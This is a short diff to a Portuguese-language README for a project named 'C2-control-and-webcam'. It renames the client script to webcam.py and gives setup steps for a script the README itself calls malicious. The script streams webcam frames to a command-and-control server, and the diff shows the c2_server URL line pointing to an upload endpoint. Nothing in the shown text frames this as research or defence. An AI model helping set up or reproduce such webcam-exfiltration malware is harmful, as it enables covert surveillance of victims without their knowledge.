@@ -74,11 +74,11 @@ cd C2-control-and-webcam
 
 <h3>2. Configurar o codigo malicioso:</h3>
 
-<p>No script <code>client.py</code>, defina o endereço IP do servidor C2 na variável <code>c2_server</code>. Por exemplo:</p>
+<p>No script <code>webcam.py</code>, defina o endereço IP do servidor C2 na variável <code>c2_server</code>. Por exemplo:</p>
 
 <pre><code>c2_server = "http://192.168.1.100:5000/upload"</code></pre>
 
-<h3>3. Iniciar o script malicioso do cliente:</h3>
+<h3>3. Iniciar o script malicioso:</h3>
 
 <p>Execute o codigo que enviará os frames da webcam para o servidor C2:</p>
 
